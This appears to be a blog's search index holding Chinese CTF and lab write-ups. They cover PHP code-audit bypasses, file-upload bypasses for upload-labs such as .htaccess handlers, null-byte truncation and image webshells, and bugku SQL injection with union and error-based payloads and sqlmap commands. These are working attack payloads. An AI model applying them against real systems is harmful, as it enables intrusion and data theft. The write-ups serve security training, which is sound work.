<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MD5加密相等绕过和intval函数四舍五入]]></title>
    <url>%2F2019%2F05%2F01%2FMD5%E5%8A%A0%E5%AF%86%E7%9B%B8%E7%AD%89%E7%BB%95%E8%BF%87%E5%92%8Cintval%E5%87%BD%E6%95%B0%E5%9B%9B%E8%88%8D%E4%BA%94%E5%85%A5%2F</url>
    <content type="text"><![CDATA[一、MD5加密相等绕过&lt;?php $md51 = md5(&apos;QNKCDZO&apos;); $a = @$_GET[&apos;a&apos;]; $md52 = @md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) { echo &quot;nctf{*****************}&quot;; } else { echo &quot;false!!!&quot;; }} else{echo &quot;please input a&quot;;} ?&gt; 将QNKCDZO进行md5加密后，发现为0e开头，所以此处考虑MD5碰撞，就是经过md5加密后以0e开头的在进行‘==’运算时，php会认为他们都为0。payload为http://127.0.0.1/myphp/test.php?a=s1885207154a 二、intval函数四舍五入&lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; payload：？id=1024.2intval函数四舍五入，取值为1024，但if语句中已成功绕过1024的限制,输出flag]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[密码MD5比较绕过和urldecode二次绕过]]></title>
    <url>%2F2019%2F05%2F01%2F%E5%AF%86%E7%A0%81MD5%E6%AF%94%E8%BE%83%E7%BB%95%E8%BF%87%E5%92%8Curldecode%E4%BA%8C%E6%AC%A1%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[一、密码MD5比较绕过​ &lt;?php //配置数据库 if($_POST[user] &amp;&amp; $_POST[pass]) { $conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) { die(&quot;Connection failed: &quot; . mysql_error($conn)); } //赋值 $user = $_POST[user]; $pass = md5($_POST[pass]); //sql语句 // select pw from php where user=&apos;&apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; # // ?user=&apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; #&amp;pass=123456 $sql = &quot;select pw from php where user=&apos;$user&apos;&quot;; $query = mysql_query($sql); if (!$query) { printf(&quot;Error: %s\n&quot;, mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) { //如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 ​ echo “Logged in! Key:** “; } else { echo(“Log in failure!“); } } ?&gt; 分析这句sql语句可以知道，我们不能直接注释掉密码 $sql = &quot;select pw from php where user=&apos;$user&apos;&quot;; 继续分析源码我们可以发现只要让row[pw]的值与pass经过md5之后的值相等即可,用union select来返回一个已知明文的md5payload= &apos; union select &apos;e10adc3949ba59abbe56e057f20f883e&apos; #&amp;pass=123456` 二、urldecode二次绕过&lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; 审计源码 eregi()函数 字符串比对解析，与大小写无关。语法: eregi(string pattern, string string, array [regs]);返回值: 整数/数组特点：PHP函数eregi()与大小写无关，类似函数ereg() 则区分大小写例：if (eregi(“C”,”abcdef”) //true 要想得出flag我们即要求id不能等于hackerDJ,又要要求id的urldecode解码等于id因此我们需要进行两次编码: h –&gt; %68 –&gt; %2568 构造url: index.php?id=%2568ackerDJ 提交即可获得flag:]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[shal()函数绕过和session验证绕过]]></title>
    <url>%2F2019%2F05%2F01%2Fshal-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8Csession%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[ereg正则截断]]></title>
    <url>%2F2019%2F05%2F01%2Fereg%E6%AD%A3%E5%88%99%E6%88%AA%E6%96%AD%2F</url>
    <content type="text"><![CDATA[&lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) { echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;; } else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) { if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置 { die(&apos;Flag: &apos; . $flag); } else { echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); } } else { echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; } } ?&gt; 审计上面代码可以发现要想的到flag必须满足一下3个条件1、必须是数字、字母组成的密码2、密码的长度小于8，却必须要大于99999993、密码必须包含— 对于第二个条件，使用科学计数法绕过对于第三个条件，由于ereg()函数存在NULL截断漏洞，所以可以用%00（空字符）来截断正则匹配。那么我们就可以绕过第3个条件了那么我们就可以构造出payload为1e8%00*—*]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入_WITH ROLLUP绕过]]></title>
    <url>%2F2019%2F05%2F01%2FSQL%E6%B3%A8%E5%85%A5-WITH-ROLLUP%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[题目地址http://ctf5.shiyanbar.com/web/pcat/index.php &lt;?php error_reporting(0); if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) { echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;; echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ //检测变量是否是数组 $StrValue=implode($StrValue); //返回由数组元素组合成的字符串 } if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){ //匹配成功一次后就会停止匹配 print &quot;水可载舟，亦可赛艇！&quot;; exit(); } } $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; foreach($_POST as $key=&gt;$value){ //遍历数组 AttackFilter($key,$value,$filter); } $con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;); if (!$con){ die(&apos;Could not connect: &apos; . mysql_error()); } $db=&quot;XXXXXX&quot;; mysql_select_db($db, $con); //设置活动的 MySQL 数据库 $sql=&quot;SELECT * FROM interest WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;; $query = mysql_query($sql); //执行一条 MySQL 查询 if (mysql_num_rows($query) == 1) { //返回结果集中行的数目 $key = mysql_fetch_array($query); //返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) { print &quot;CTF{XXXXXX}&quot;; }else{ print &quot;亦可赛艇！&quot;; } }else{ print &quot;一颗赛艇！&quot;; } mysql_close($con); ?&gt; 审计代码寻找有用部分 if (mysql_num_rows($query) == 1) { //返回结果集中行的数目 $key = mysql_fetch_array($query); //返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) { print &quot;CTF{XXXXXX}&quot;; 注入成功要满足2个条件： mysql_num_rows($query) == 1 即查询返回的结果行数为1 $key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同 从源代码得出，注入点在uname这个位置上，$filter没有过滤掉 or $sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[‘uname’]}’”; $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;; 对and等等进行过滤。 那么如果只让其对返回结果只取最后一行呢，自然而然的想到limit a,b这样的命令。但是“，”被过滤了。那么我们可以使用 limit a offset b SQL查询语句中的 limit 与 offset 的区别： limit y 分句表示: 读取 y 条数据 //limit 10,就是 从第0个开始，获取10条数据 limit x, y 分句表示: 跳过 x 条数据，读取 y 条数据 //limit 1,2 就是读取2-3条数据 limit y offset x 分句表示: 跳过 x 条数据，读取 y 条数据 //limit 2 offest 1 就是读取2-3条数据 注意初始偏移量为0 payload如下 uname=&apos; || 1 group by pwd with rollup limit 1 offset 2 # // uname=’ or 1 group by pwd with rollup limit 1 offset 2# ‘是对前面的’的封闭，然后利用||1将这个条件变成true，即可得出flag, (group by是把前面的查询的内容按照pwd来分组。with rollup是统计信息的这里就是重点了，因为代码中$key[‘pwd’] == $_POST[‘pwd’]用的是双等号是弱比较。而with rollup会在查询的结果后面加上一个为空的列,所以password为空和NULL是相等的就绕过了pwd的比较) 至于为啥offset 2，这个是试出来的，其实我们根本不可能知道with rollup会总结归纳出多少条信息，offset 2能过说明正确的pwd位于第三条信息 这里要注意一点，当使用rollup的时候就不能使用order by进行排序，换句话说 rollup和order by是相互排斥的。]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[多重加密]]></title>
    <url>%2F2019%2F05%2F01%2FMultiple-Encryption%2F</url>
    <content type="text"><![CDATA[&lt;?php include &apos;common.php&apos;; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE); //把一个或多个数组合并为一个数组 class db { public $where; function __wakeup() { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query(&apos;select * from user where &apos;.$where); //函数执行一条 MySQL 查询。 return @mysql_fetch_array($sql); //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false } } if(isset($requset[&apos;token&apos;])) //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。 { $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;]))); //gzuncompress:进行字符串压缩 //unserialize: 将已序列化的字符串还原回 PHP 的值 $db = new db(); $row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;); //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 if($login[&apos;user&apos;] === &apos;ichunqiu&apos;) { echo $flag; }else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;]){ echo &apos;unserialize injection!!&apos;; }else{ echo &quot;(╯‵□′)╯︵┴─┴ &quot;; } }else{ header(&apos;Location: index.php?error=1&apos;); } ?&gt; 阅读代码寻找有用的代码段 if($login[&apos;user&apos;] === &apos;ichunqiu&apos;) { echo $flag; 发现login[user]要求=ichunqiu，才能输出flag。但是 $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;]))); //先对token进行base-64解密，然后再进行解压gzuncompress字符串，最后在反序列化 那么我们就要在cookie中给token一个参数，先是创建一个数组并给其中的user键赋值为ichunqiu先序列化，然后压缩字符串（gzcompress方法），最后再base-64加密写成php代码如下（） &lt;?php $a = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;); $b = base64_encode(gzcompress(serialize($a))); echo $b ?&gt; 可以输出 然后抓包，在cookie中添加 taken参数，其值为截图中的内容即可得出flag]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[绕过过滤的空白字符]]></title>
    <url>%2F2019%2F04%2F08%2FBlank-to-bypass%2F</url>
    <content type="text"><![CDATA[&lt;?php $info = &quot;&quot;; $req = []; $flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;; ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值 error_reporting(0); //关闭所有PHP错误报告 if(!isset($_GET[&apos;number&apos;])){ header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt die(&quot;have a fun!!&quot;); //die — 等同于 exit() } foreach([$_GET, $_POST] as $global_var) { //foreach 语法结构提供了遍历数组的简单方式 foreach($global_var as $key =&gt; $value) { $value = trim($value); //trim — 去除字符串首尾处的空白字符（或者其他字符） is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串 } } ​ function is_palindrome_number($number) { $number = strval($number); //strval — 获取变量的字符串值 $i = 0; $j = strlen($number) - 1; //strlen — 获取字符串长度 while($i &lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j–; } return true; } ​ if(is_numeric($_REQUEST[‘number’])) //is_numeric — 检测变量是否为数字或数字字符串 { $info=&quot;sorry, you cann&apos;t input a number!&quot;; } elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;]))) //intval — 获取变量的整数值 { $info = &quot;number must be equal to it&apos;s integer!! &quot;; } else { $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2){ $info=&quot;no, this is not a palindrome number!&quot;; } else { if(is_palindrome_number($req[&quot;number&quot;])){ $info = &quot;nice! {$value1} is a palindrome number!&quot;; } else { $info=$flag; } } } echo $info; 审计代码可以发现，number必须符合下面3个条件才可以输出flag1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)2.不能是一个回文数。（is_palindrome_number判断）3.该数的反转的整数值应该和它本身的整数值相等;即 intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;])) 但是2和3又冲突，这该怎么办 方法一我们构造的payload为： ?number=%002147483647 解释下为什么可以这么构造；1、is_numeric函数对于空字符%00判断为非数值，绕过第一个条件。 函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符%20和空字符%00。 2、2147483647不是一个回文数绕过第二个条件。 3、这里利用了intval函数的溢出问题。 Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。 至于服务器是什么系统的可以用burp抓包分析出来为32位 $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); 我们构造的2147483647经过strrev反转函数后为7463847412，又经过intval函数值又变为2147483647。故满足条件3，可以输出flag 方法二因为要求不能为回文数，但又要满足intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))，所以我们采用科学计数法构造payload为number=0e-0%00，这样的话我们就可以绕过。 xey在php中就是x*10的y次方 注意is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后 方法三is_numeric函数在开始判断前，会先跳过所有空白字符可是题目获取$req[‘number’]的时候明明使用trim过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。所以我们构造payload=URL?%00%0c191即可绕过上面的条件获得flag]]></content>
      <categories>
        <category>代码审计（基础篇）</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[upload-labs 1-17]]></title>
    <url>%2F2019%2F04%2F08%2Fupload-labs-1-17%2F</url>
    <content type="text"><![CDATA[一、pass011、首先我们尝试下上传一个php文件，发现文件类型被限制了我们查看下源码发现是使用js代码对文件类型进行限制。那么我们使用火狐浏览器的插件Noscript，打开这个插件即可禁用掉js代码，然后成功上传PHP,文件。2、当然这个太麻烦了，我们可以直接删除这个坚持文件格式的函数即可。3、我们上传个正常的图片，图片的路径：http://127.0.0.1/upload-lab/upload/1.jpg查看图片路径发现文件名没被修改，那么我们可以使用抓包，修改文件名类型，把php文件改为jpg文件，然后通过抓包再改为PHP文件。 二、pass02使用第一题中的第三种方法即可。查看提示mime的意思就是文件的后缀名 三、pass03发现第二题的方法已经失效了，我们查看下源码。 $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;);//查找字符在指定字符串中从左边开始的最后一次出现的位置，如果成功，返回该字符以及其后面的字符 $file_ext = strtolower($file_ext); //转换为小写，就可以防止大小写逃逸了 $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = &apos;上传出错！&apos;; } } else { $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 可以看到代码使用黑名单来过滤，php的话有时候（配置的原因）php、php3、php4、php5、phtml、pht这些后缀也是可以被解析的，其他语言也有类似的情况，需要尝试： 由于我这里使用的是phpstudy+windows，由于配置原因是解析不了php3等等这些后缀的 四、pass04第四题直接进制常见的.asp|.aspx|.php|.jsp等常见后缀文件，但是又一种文件格式没禁用，那就是.htaccess 启用.htaccess，需要修改httpd.conf，启用AllowOverride（将该值改为all），并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。 然后先上传,htaccess文件，文件内容如下 &lt;FilesMatch &quot;2.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; .htaccess文件的内容的意思是 对2.jpg使用php重新解析然后再上传jpg脚本， 五、pass05观察源码我们可以发现，本题把.htaccess文件也禁用了。但是认真对比与第四题的代码，本题去掉了大小写绕过的逃逸。 六、pass06对比第五题的源码可以发现，本题源码少了 $file_ext = trim($file_ext); //首尾去空，那么我们可以上传PHP文件，然后使用burp suit抓包修改后缀名格式为php加空格。 但返回题目提示文件不允许上传，不慌观察抓包的文件，其实文件已经上传，路径在抓包里有 七、pass07与第六题源码对比，发现少了$file_name = deldot($file_name);//删除文件名末尾的点这句代码。那么我们就可以。那么在文件名末尾加个点号就可以了，参考第6题 八、pass08比第七题少了$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA 在php+windows的情况下：如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。 参考第6题 九、pass09这一关是上面几关的综合，但是他有个逻辑漏洞程序先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用类似one.php. .(两个点号之间有一个空格)绕过，这有点像sql注入中的re_place只过滤一次关键字。操作与第6题类似. 十、pass10上传php文件发现，文件后缀名没掉了。上传jpg文件一切正常。怀疑是绕过观察下源码 $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 由这3句可以看出，部分文件1后缀名被替换成了空格那么我们抓包，该后缀名，双写绕过。 十一、pass11关键的代码在于这里的’save_path’是一个可控的变量，但是后面还拼接上一个后缀名，也需要绕过 $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 这个时候可以使用%00截断，但这东西有点过气了，因为需要两个条件php版本小于5.3.4php的magic_quotes_gpc为OFF状态如果要完成这一个题目就必须要实现上面的两个条件，但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点所以如果要绕过，我们可以这样去实现，另save_path等于下面的值 ../upload/4.php%001 十二、pass12这里的源代码就改了一点点，就是把get改为post类型，一样的方式绕过，只不过这里需要在二进制里面修改%00，因为post不会像get对%00进行自动解码。 $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; 十三、pass13观察源码可以发现只对文件的头2个字节做检测 $bin = fread($file, 2); //只读2字节 fclose($file); 制作木马图片，然后上传即可，上传图片后利用就要结和文件包含漏洞了。 制作木马图片最简单的方式 copy 1.jpg /b + 1l.php /a 1.jpg 十四、pass14是这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过：介绍下getimagesize array getimagesize ( string $filename [, array &amp;$imageinfo ] ) getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。 如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 十五、pass15这里用到php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过： 十六、pass16imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。 该系列函数有： imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像 imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像 imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像 imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像 imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像 这一关对后缀名和文件类型啥的都进行了很严格的控制，而且在后面还对图片进行了二次编译这一个题目的思路，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传，下载下来后发现这一部分插入代码的没变但是其他部分都变了。其他部分与13题一样 十七、pass17参考这篇博客http://www.cnblogs.com/jinqi520/p/9977256.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bugku 38-48 writeup(web)]]></title>
    <url>%2F2019%2F04%2F08%2Fbugku-38-48%2F</url>
    <content type="text"><![CDATA[一、第38题（这是一个神奇的登陆框）方法一首先我们抓包，经过一些尝试发现存在sql注入，并且sql语句是使用“来闭合的。爆数据库 admin_name=1&quot; union select database(),2#&amp;admin_passwd=1&amp;submit=GO+GO+GO 爆数据表 admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 爆字段名 admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 爆数据 admin_name=1&quot; union select (select flag1 from flag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 方法二将抓到的报保存为.txt文件放在sqlmap的安装目录下。爆数据库 python2 sqlmap.py -r &quot;3.txt&quot; -p admin_name --dbs 爆表 python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -p admin_name --tables 爆字段名爆数据 python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump 以上2种方法均是对admin_name进行注入，当然也可以对admin_passwd进行注入 二、第39题（多次）尝试id=1&apos;,发现报错， 尝试id=1&apos; --+发现没有报错 说明存在sql注入 尝试id=1&apos; or --+报错， 说明存在某种过滤 尝试id=1&apos; oorr --+发现没有报错 在这里我们可以使用异或注入来检查哪些字符被过滤这时我们可以用异或注入来检测，异或即两个条件相同（同真或同假）即为假 http://123.206.87.240:9004/1ndex.php?id=1&apos;^(length(&apos;or&apos;)!=0)--+ 当length（）里的字符被过滤时，就输出there is nothing.经过一些尝试可以知道and or select union被绕过 开始爆数据库 http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,database()--+ 可以爆出数据库为爆表 http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&quot;web1002-1&quot;--+ 爆字段 http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&quot;flag1&quot;--+ 爆数据 http://123.206.87.240:9004/1ndex.php?id=-1&apos; uniunionon seselectlect 1,flag1 from flag--+ 提交flag 发现是假的flag,那么我们爆另一个字段使用上面的方法，经过尝试发现我们注入的代码会在IP处不解析的输出那么我们尝试下报错注入爆数据库 http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e,database(),0x7e)))--+ 爆数据表http://123.206.87.240:9004/Once_More.php?id=1&#39; and(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columnswhere table_schema=”web1002-2”),0x7e)))–+爆字段（其实我们可以猜测字段名为flag2） http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=&quot;web1002-2&quot; and table_name=&quot;flag2&quot;),0x7e)))--+ 爆flag http://123.206.87.240:9004/Once_More.php?id=1&apos; and (extractvalue(1,concat(0x7e, (select group_concat(flag2) from flag2),0x7e)))--+ 三、第40题（PHP_encrypt_1）题目给出了压缩包，下载打开，发现是某种加密方式，需要我们阅读代码，写出解密代码 &lt;?php function encrypt($data,$key) { $key = md5(&apos;ISCC&apos;); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x+=1; } for ($i=0; $i &lt; $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?&gt; 参考网上的大佬写的代码，该题涉及密码学，逆向，web &lt;?php function decrypt($str) { $mkey = &quot;729623334f0aa2784a1599fd374c120d&quot;; $klen = strlen($mkey); $tmp = $str; $tmp = base64_decode($tmp); // 对 base64 后的字符串 decode $md_len = strlen($tmp); //获取字符串长度 for ($i=0; $i &lt; $md_len; $i++) { // 取二次加密用 key; if ($x == $klen) // 数据长度是否超过 key 长度检测 $x = 0; $char .= $mkey[$x]; // 从 key 中取二次加密用 key $x+=1; } $md_data = array(); for($i=0;$i&lt;$md_len;$i++) { // 取偏移后密文数据 array_push($md_data, ord($tmp[$i])); } $md_data_source = array(); $data1 = &quot;&quot;; $data2 = &quot;&quot;; foreach ($md_data as $key =&gt; $value) { // 对偏移后的密文数据进行还原 $i = $key; if($i &gt;= strlen($mkey)) {$i = $i - strlen($mkey);} $dd = $value; $od = ord($mkey[$i]); array_push($md_data_source,$dd); $data1 .= chr(($dd+128)-$od); // 第一种可能, 余数+128-key 为回归数 $data2 .= chr($dd-$od); // 第二种可能, 余数直接-key 为回归数 } print &quot;data1 =&gt; &quot;.$data1.&quot;&lt;br&gt;\n&quot;; print &quot;data2 =&gt; &quot;.$data2.&quot;&lt;br&gt;\n&quot;; } $str = &quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&quot;; decrypt($str); ?&gt; 四、第41题（文件包含2）由于无法打卡该题目网站，本题略 四、第42题（文件包含2）这题考的是代码审计首先，我们提交login发现没反应，题目提示hint那么我们传入？hint=1试试，发现 &lt;?php error_reporting(0); include_once(&quot;flag.php&quot;); $cookie = $_COOKIE[&apos;ISecer&apos;]; if(isset($_GET[&apos;hint&apos;])){ show_source(__FILE__); } elseif (unserialize($cookie) === &quot;$KEY&quot;) { echo &quot;$flag&quot;; } else { ?&gt; &lt;html&gt; 